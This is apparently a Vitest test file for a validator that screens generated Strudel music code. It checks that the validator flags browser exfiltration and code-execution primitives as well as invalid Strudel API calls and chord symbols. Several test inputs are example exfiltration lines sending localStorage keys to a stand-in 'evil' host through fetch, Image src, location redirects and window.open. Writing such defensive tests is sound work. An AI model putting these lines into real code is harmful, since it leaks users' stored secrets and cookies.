import { describe, it, expect } from 'vitest';
import { validateCode, stripEmojis } from './codeGuard.mjs';

const warns = (code) => validateCode(code).map((w) => w.toLowerCase());
const hasWarn = (code, needle) => warns(code).some((w) => w.includes(needle.toLowerCase()));

describe('stripEmojis', () => {
  it('removes emoji and keeps ASCII intact', () => {
    expect(stripEmojis('note("c3") 🎵')).toBe('note("c3") ');
    expect(stripEmojis('plain ascii code')).toBe('plain ascii code');
  });
  it('strips ZWJ-composed emoji sequences', () => {
    // family emoji uses ZWJ (U+200D); the ZWJ + VS16 components are stripped
    const out = stripEmojis('x👨‍👩‍👧y');
    expect(out).not.toMatch(/\u{200D}/u);
    expect(out.startsWith('x')).toBe(true);
  });
});

describe('validateCode — exfiltration / execution primitives blocked', () => {
  it('blocks direct network calls', () => {
    expect(hasWarn('fetch("https://evil/x")', 'fetch')).toBe(true);
    expect(hasWarn('const x = new WebSocket("wss://x")', 'websocket')).toBe(true);
    expect(hasWarn('navigator.sendBeacon(url, data)', 'sendbeacon')).toBe(true);
  });
  it('blocks storage / credential access', () => {
    expect(hasWarn('localStorage.getItem("key")', 'localstorage')).toBe(true);
    expect(hasWarn('document.cookie', 'cookie')).toBe(true);
    expect(hasWarn('await indexedDB.open("x")', 'indexeddb')).toBe(true);
  });
  it('blocks code execution primitives', () => {
    expect(hasWarn('eval("1+1")', 'eval')).toBe(true);
    expect(hasWarn('new Function("return 1")', 'function')).toBe(true);
    expect(hasWarn('import("mod")', 'import')).toBe(true);
  });
  it('blocks timer-based implicit eval channels', () => {
    expect(hasWarn('setTimeout(()=>fetch("/x"), 10)', 'settimeout')).toBe(true);
    expect(hasWarn('setInterval(()=>{}, 100)', 'setinterval')).toBe(true);
  });
  it('blocks indirect access via string literals (globalThis["fetch"], Reflect.get)', () => {
    expect(hasWarn('globalThis["fetch"]("/x")', 'fetch')).toBe(true);
    expect(hasWarn('window["localStorage"]', 'localstorage')).toBe(true);
    expect(hasWarn('Reflect.get(self, "eval")', 'reflect')).toBe(true);
  });
  it('does NOT flag dangerous words inside comments (comments are stripped)', () => {
    expect(hasWarn('// this example uses fetch( internally', 'fetch')).toBe(false);
    expect(hasWarn('/* localStorage is not used here */', 'localstorage')).toBe(false);
  });
});

describe('validateCode — image / redirect / DOM exfiltration channels blocked', () => {
  it('blocks Image-based exfiltration (design-issues §11 main vector)', () => {
    expect(hasWarn('new Image().src = "https://evil/?k=" + localStorage.key', 'image')).toBe(true);
    // new Image() 即被拦截（变量赋值后的 i.src 不固定，但 new Image 已是外泄起点）
    expect(hasWarn('const i = new Image(); i.src = url', 'new image')).toBe(true);
  });
  it('blocks location redirect exfiltration', () => {
    expect(hasWarn('location.href = "https://evil/?k=" + key', 'location redirect')).toBe(true);
    expect(hasWarn('location.replace("https://evil/")', 'location redirect')).toBe(true);
  });
  it('blocks window.open exfiltration', () => {
    expect(hasWarn('window.open("https://evil/?k=" + key)', 'window.open')).toBe(true);
  });
  it('blocks Worker variants', () => {
    expect(hasWarn('new SharedWorker("w.js")', 'sharedworker')).toBe(true);
    expect(hasWarn('navigator.serviceWorker.register("sw.js")', 'serviceworker')).toBe(true);
  });
  it('blocks DOM injection (document.write / innerHTML)', () => {
    expect(hasWarn('document.write("<script>")', 'document.write')).toBe(true);
    expect(hasWarn('el.innerHTML = "<img src=x>"', 'innerhtml')).toBe(true);
  });
  it('blocks Blob URL and clipboard access', () => {
    expect(hasWarn('URL.createObjectURL(new Blob([data]))', 'createobjecturl')).toBe(true);
    expect(hasWarn('navigator.clipboard.readText()', 'clipboard')).toBe(true);
  });
  it('blocks indirect Image access via string literal', () => {
    expect(hasWarn('globalThis["Image"]', 'image')).toBe(true);
  });
  it('does NOT flag legitimate Strudel code', () => {
    expect(hasWarn('$: s("bd sd hh oh").gain(0.8)', 'image')).toBe(false);
    expect(hasWarn('note("c3 e3 g3").s("piano").room(0.7)', 'location')).toBe(false);
  });
});

describe('validateCode — invalid Strudel API detection', () => {
  it('flags non-existent effect methods with fix hints', () => {
    expect(hasWarn('s("bd").reverb(0.5)', 'reverb')).toBe(true);
    expect(hasWarn('s("bd").echo(0.3)', 'echo')).toBe(true);
    expect(hasWarn('note("c3").slidedelta(0.2)', 'slidedelta')).toBe(true);
  });
  it('flags array arguments to note()/s()', () => {
    expect(hasWarn('note(["c3","e3"])', 'array')).toBe(true);
    expect(hasWarn('s(["bd","sd"])', 'array')).toBe(true);
  });
  it('flags multiple simultaneous top-level patterns missing $: prefix', () => {
    expect(hasWarn('note("c3 e3 g3")\ns("bd sd")', 'prefix')).toBe(true);
  });
});

describe('validateCode — clean code passes', () => {
  it('no warnings for a well-formed multi-track pattern', () => {
    const clean = [
      'setcpm(124/4)',
      '$: s("bd*4").gain("1 0.9 0.95 0.9")',
      '$: s("hh*8").swing(0.16).pan("<0.3 0.7>")',
      '$: note("<c2 eb2 g2 bb2>").s("sawtooth").lpf(400).room(0.3)',
    ].join('\n');
    expect(validateCode(clean)).toEqual([]);
  });
});

describe('validateCode — wrong chord-symbol notation blocked', () => {
  // voicing() 字典用 iReal 记号（^7/M7/-7/m7），不认 maj7/min7 全拼形式；
  // 错符号会让 .voicing() 静默返回 silence。codeGuard 必须静态拦截并给出修正。
  it('flags maj7 / min7 longhand symbols with the iReal fix', () => {
    expect(hasWarn('chord("<Cmaj7 Am7 G7>").voicing()', 'maj7')).toBe(true);
    expect(hasWarn('chord("<Fmaj7 Dm7>").voicing()', 'maj7')).toBe(true);
    expect(hasWarn('chord("<Emaj9 Bm9>").voicing()', 'maj9')).toBe(true);
  });
  it('does NOT flag the correct iReal notation (^7 / M7 / -7 / m7)', () => {
    const good = 'chord("<C^7 Am7 D-7 G7>").anchor("c4").voicing()';
    const ws = validateCode(good).filter((w) => w.toLowerCase().includes('chord symbol'));
    expect(ws).toEqual([]);
  });
  it('does not false-positive on note names or comments', () => {
    expect(hasWarn('note("c3 e3 g3 b3")', 'chord symbol')).toBe(false);
    // 普通词里的小写 maj 不应被当作和弦符号
    expect(hasWarn('// imagine a majestic chord here', 'chord symbol')).toBe(false);
  });
});
